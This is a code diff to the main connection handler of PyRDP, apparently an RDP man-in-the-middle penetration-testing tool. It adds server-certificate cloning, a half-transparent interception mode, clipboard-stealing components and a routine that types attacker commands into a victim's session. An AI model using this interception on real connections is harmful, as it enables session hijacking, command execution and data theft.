@@ -1,17 +1,18 @@
 #
 # This file is part of the PyRDP project.
-# Copyright (C) 2019 GoSecure Inc.
+# Copyright (C) 2019-2020 GoSecure Inc.
 # Licensed under the GPLv3 or later.
 #
 
 import asyncio
 import datetime
+import typing
 
 from twisted.internet import reactor
 from twisted.internet.protocol import Protocol
 
 from pyrdp.core import AsyncIOSequencer, AwaitableClientFactory, connectTransparent
-from pyrdp.core.ssl import ClientTLSContext, ServerTLSContext
+from pyrdp.core.ssl import ClientTLSContext, ServerTLSContext, CertificateCache
 from pyrdp.enum import MCSChannelName, ParserMode, PlayerPDUType, ScanCode, SegmentationPDUType
 from pyrdp.layer import ClipboardLayer, DeviceRedirectionLayer, LayerChainItem, RawLayer, \
     VirtualChannelLayer
@@ -84,7 +85,7 @@ class RDPMITM:
         self.statCounter = StatCounter()
         """Class to keep track of connection-related statistics such as # of mouse events, # of output events, etc."""
 
-        self.state = state if state is not None else RDPMITMState(self.config)
+        self.state = state if state is not None else RDPMITMState(self.config, self.log.sessionID)
         """The MITM state"""
 
         self.client = RDPLayerSet()
@@ -137,9 +138,12 @@ class RDPMITM:
 
         self.player.player.addObserver(LayerLogger(self.attackerLog))
 
-        self.config.outDir.mkdir(parents=True, exist_ok=True)
-        self.config.replayDir.mkdir(exist_ok=True)
-        self.config.fileDir.mkdir(exist_ok=True)
+        self.ensureOutDir()
+
+        if config.certificateFileName is None:
+            self.certs: CertificateCache = CertificateCache(self.config.certDir, mainLogger.createChild("cert"))
+        else:
+            self.certs = None
 
         self.state.securitySettings.addObserver(RC4LoggingObserver(self.rc4Log))
 
@@ -148,7 +152,7 @@ class RDPMITM:
             replayFileName = "rdp_replay_{}_{}_{}.pyrdp"\
                     .format(date.strftime('%Y%m%d_%H-%M-%S'),
                             date.microsecond // 1000,
-                            self.log.sessionID)
+                            self.state.sessionID)
             self.recorder.setRecordFilename(replayFileName)
             self.recorder.addTransport(FileLayer(self.config.replayDir / replayFileName))
 
@@ -191,7 +195,13 @@ class RDPMITM:
         serverFactory = AwaitableClientFactory(self.server.tcp)
         if self.config.transparent:
             src = self.client.tcp.transport.client
-            connectTransparent(self.config.targetHost, self.config.targetPort, serverFactory, bindAddress=(src[0], 0))
+            if self.config.targetHost:
+                # Fully Transparent (with a specific poisoned target.)
+                connectTransparent(self.config.targetHost, self.config.targetPort, serverFactory, bindAddress=(src[0], 0))
+            else:
+                # Half Transparent (for client-side only)
+                dst = self.client.tcp.transport.getHost().host
+                reactor.connectTCP(dst, self.config.targetPort, serverFactory)
         else:
             reactor.connectTCP(self.config.targetHost, self.config.targetPort, serverFactory)
 
@@ -207,17 +217,41 @@ class RDPMITM:
             except asyncio.TimeoutError:
                 self.log.error("Failed to connect to recording host: timeout expired")
 
-    def startTLS(self):
+    def doClientTls(self):
+        cert = self.server.tcp.transport.getPeerCertificate()
+        if not cert:
+            # Wait for server certificate
+            reactor.callLater(1, self.doClientTls)
+
+        # Clone certificate if necessary.
+        if self.certs:
+            privKey, certFile = self.certs.lookup(cert)
+            contextForClient = ServerTLSContext(privKey, certFile)
+        else:
+            # No automated certificate cloning. Use the specified certificate.
+            contextForClient = ServerTLSContext(self.config.privateKeyFileName, self.config.certificateFileName)
+
+        # Establish TLS tunnel with the client
+        self.onTlsReady()
+        self.client.tcp.startTLS(contextForClient)
+        self.onTlsReady = None
+
+        # Add unknown packet handlers.
+        self.client.segmentation.addObserver(PacketForwarder(self.server.tcp))
+        self.server.segmentation.addObserver(PacketForwarder(self.client.tcp))
+
+    def startTLS(self, onTlsReady: typing.Callable[[], None]):
         """
         Execute a startTLS on both the client and server side.
         """
-        contextForClient = ServerTLSContext(self.config.privateKeyFileName, self.config.certificateFileName)
-        contextForServer = ClientTLSContext()
+        self.onTlsReady = onTlsReady
 
-        self.client.tcp.startTLS(contextForClient)
+        # Establish TLS tunnel with target server...
+        contextForServer = ClientTLSContext()
         self.server.tcp.startTLS(contextForServer)
-        self.client.segmentation.addObserver(PacketForwarder(self.server.tcp))
-        self.server.segmentation.addObserver(PacketForwarder(self.client.tcp))
+
+        # Establish TLS tunnel with client.
+        reactor.callLater(1, self.doClientTls)
 
     def buildChannel(self, client: MCSServerChannel, server: MCSClientChannel):
         """
@@ -227,12 +261,13 @@ class RDPMITM:
         :param server: MCS channel for the server side
         """
 
-        userID = client.userID
         channelID = client.channelID
 
-        if userID == channelID:
+        if channelID not in self.state.channelMap:
             self.buildVirtualChannel(client, server)
-        elif self.state.channelMap[channelID] == MCSChannelName.IO:
+            return
+
+        if self.state.channelMap[channelID] == MCSChannelName.IO:
             self.buildIOChannel(client, server)
         elif self.state.channelMap[channelID] == MCSChannelName.CLIPBOARD:
             self.buildClipboardChannel(client, server)
@@ -264,7 +299,7 @@ class RDPMITM:
         self.security = SecurityMITM(self.client.security, self.server.security, self.getLog("security"), self.config, self.state, self.recorder)
         self.fastPath = FastPathMITM(self.client.fastPath, self.server.fastPath, self.state, self.statCounter)
 
-        if self.player.tcp.transport:
+        if self.player.tcp.transport or self.config.payload:
             self.attacker = AttackerMITM(self.client.fastPath, self.server.fastPath, self.player.player, self.log, self.state, self.recorder)
 
             if MCSChannelName.DEVICE_REDIRECTION in self.state.channelMap:
@@ -303,11 +338,11 @@ class RDPMITM:
         LayerChainItem.chain(server, serverSecurity, serverVirtualChannel, serverLayer)
 
         if self.config.disableActiveClipboardStealing:
-            mitm = PassiveClipboardStealer(clientLayer, serverLayer, self.getLog(MCSChannelName.CLIPBOARD),
-                                           self.recorder, self.statCounter)
+            mitm = PassiveClipboardStealer(self.config, clientLayer, serverLayer, self.getLog(MCSChannelName.CLIPBOARD),
+                                           self.recorder, self.statCounter, self.state)
         else:
-            mitm = ActiveClipboardStealer(clientLayer, serverLayer, self.getLog(MCSChannelName.CLIPBOARD),
-                                          self.recorder, self.statCounter)
+            mitm = ActiveClipboardStealer(self.config, clientLayer, serverLayer, self.getLog(MCSChannelName.CLIPBOARD),
+                                          self.recorder, self.statCounter, self.state)
         self.channelMITMs[client.channelID] = mitm
 
     def buildDeviceChannel(self, client: MCSServerChannel, server: MCSClientChannel):
@@ -390,8 +425,7 @@ class RDPMITM:
             return 200
 
         def sendPayload() -> int:
-            self.attacker.sendText(self.config.payload + " & exit")
-            return 200
+            return self.attacker.sendText(self.config.payload + " & exit")
 
         def waitForPayload() -> int:
             return self.config.payloadDuration
@@ -400,15 +434,22 @@ class RDPMITM:
             self.state.forwardInput = True
             self.state.forwardOutput = True
 
+        payload = sendPayload()
         sequencer = AsyncIOSequencer([
             waitForDelay,
             disableForwarding,
             openRunWindow,
             sendCMD,
             sendEnterKey,
-            sendPayload,
+            *payload,
             sendEnterKey,
             waitForPayload,
             enableForwarding
         ])
         sequencer.run()
+
+    def ensureOutDir(self):
+        self.config.outDir.mkdir(parents=True, exist_ok=True)
+        self.config.replayDir.mkdir(exist_ok=True)
+        self.config.fileDir.mkdir(exist_ok=True)
+        self.config.certDir.mkdir(exist_ok=True)
